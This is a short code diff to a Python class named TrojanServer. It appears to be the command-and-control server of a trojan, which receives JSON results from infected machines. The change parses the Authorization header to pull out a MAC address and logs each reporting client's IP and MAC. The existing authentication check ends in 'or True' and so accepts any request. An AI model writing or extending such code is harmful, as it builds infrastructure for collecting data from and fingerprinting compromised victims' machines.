@@ -80,9 +80,11 @@ class TrojanServer():
     def result(self):
         sha1 = hashlib.sha1()
         sha1.update(KEY)
+        SHA = request.headers.get('Authorization').split('::::')[1]
+        MAC = request.headers.get('Authorization').split('::::')[0]
 
         if request.headers.get('Authorization') == sha1.hexdigest() or True:
-            print(request.remote_addr)
+            print(request.remote_addr + " " + MAC)
             if request.mimetype == "application/json":
                 try:
                     resultjson = json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8")
